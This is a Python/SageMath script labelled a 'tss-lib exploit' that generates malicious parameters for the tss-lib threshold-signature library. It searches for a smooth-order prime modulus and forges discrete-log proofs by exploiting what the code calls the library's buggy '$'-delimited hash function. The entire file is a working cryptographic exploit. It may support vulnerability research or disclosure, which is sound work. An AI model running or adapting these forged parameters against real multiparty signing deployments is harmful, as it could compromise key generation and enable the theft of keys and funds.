"""
tss-lib exploit: gen_params

Require a python 3.10 conda environment with sagemath and pycryptodome
installed to run.
"""
from dataclasses import dataclass
from typing import Tuple, Optional, List
from sage.all import prime_range, is_prime, gp, mod, crt
from Crypto.Hash import SHA512
import random

SMALL_PRIMES = prime_range(10 ** 3, 10 ** 4)


def search_p(nbits=2048) -> int:
    """Find a prime `p` such that Zp* is of smooth order."""
    while True:
        p = 2
        while p.bit_length() < nbits:
            p *= int(random.choice(SMALL_PRIMES))
        p += 1
        if (p ** 2).bit_length() == nbits * 2 and is_prime(p):
            return p


def compute_x_x(x: int, l: Optional[int] = None) -> int:
    """Return x|$|x."""
    l = x.bit_length() if l is None else l
    l = (l + 7) // 8 * 8
    return x * (2 ** (l + 8) + 1) + ord('$') * 2 ** l


def search_p_h1_h2() -> Tuple[int, int, int, int]:
    """
    Search for p, h1, h2, exp such that:
        - h2 = r**p mod p**2 (h2 has order p-1)
        - h2/h1 = compute_x_x(h2) (for forging proof of dlog(h1, base=h2))
        - h2 == h1**exp mod p**2
    """
    while True:
        p = search_p(1024)
        h2 = pow(2, p, p ** 2)
        alpha0 = pow(h2, 1337, p ** 2)
        alpha1 = compute_x_x(alpha0, 2048 + 8)
        h1 = alpha0 * pow(alpha1, -1, p ** 2) % p ** 2
        exp1 = 0  # (h1**(p-1))**exp1 == h2**(p-1) == 1 mod p**2
        h1__p = pow(h1, p, p ** 2)
        h2__p = pow(h2, p, p ** 2)
        try:
            exp2 = int(gp.znlog(h2__p, mod(h1__p, p ** 2)))
        except ValueError:
            continue
        exp = crt(exp1, exp2, p, p - 1)
        return p, h1, h2, exp


def hash_ints(ints):
    """Reimplement the buggy hash function of tss-lib."""
    hash_obj = SHA512.new(truncate="256")
    hash_obj.update(len(ints).to_bytes(8, "little"))
    for i in ints:
        hash_obj.update(i.to_bytes((i.bit_length() + 7) // 8, "big"))
        hash_obj.update(b"$")
    return int.from_bytes(hash_obj.digest(), "big")


@dataclass
class Proof:
    alpha: List[int]
    t: List[int]


def build_proofs(p: int, h1: int, h2: int, exp: int) -> Tuple[Proof, Proof]:
    """Build proofs for discrete logs between h1 and h2."""
    assert pow(h2, p - 1, p ** 2) == 1
    assert pow(h1, exp, p ** 2) == h2

    # forging proof of dlog(h1, base=h2)
    alpha0 = pow(h2, 1337, p ** 2)
    while alpha0.bit_length() <= 2048:
        alpha0 += p ** 2
    alpha1 = compute_x_x(alpha0)
    found = False
    challenge = 0
    while not found:
        for c1 in range(64 - 12, 64 + 12):
            c0 = 128 - c1
            challenge = hash_ints([h2, h1, p ** 2] + [alpha0] * c0 + [alpha1] * c1) % 2 ** 128
            if challenge.bit_count() == c1:
                found = True
                break
        if found:
            break

        alpha0 += p ** 2
        assert alpha0.bit_length() <= 2048 + 8
        alpha1 = compute_x_x(alpha0)

    proof_dlog_h1_base_h2 = Proof(
        alpha=[alpha1 if challenge >> i & 1 else alpha0 for i in range(128)],
        t=[1337] * 128
    )

    # building proof of dlog(h2, base=h1)
    assert pow(h1, exp, p ** 2) == h2
    alpha = pow(h1, 1337, p ** 2)
    challenge = hash_ints([h1, h2, p ** 2] + [alpha] * 128) % 2 ** 128
    proof_dlog_h2_base_h1 = Proof(
        alpha=[alpha] * 128,
        t=[1337 + (exp if challenge >> i & 1 else 0) for i in range(128)]
    )

    return proof_dlog_h2_base_h1, proof_dlog_h1_base_h2


def generate_malicious_params():
    """Generate malicious params and write to a file at `outpath`."""
    p, h1, h2, exp = search_p_h1_h2()
    proof_dlog_h2_base_h1, proof_dlog_h1_base_h2 = build_proofs(p, h1, h2, exp)
    [
        print(i) for i in (
            [p ** 2, h1, h2] +
            proof_dlog_h2_base_h1.alpha +
            proof_dlog_h2_base_h1.t +
            proof_dlog_h1_base_h2.alpha +
            proof_dlog_h1_base_h2.t
    )]


if __name__ == '__main__':
    generate_malicious_params()
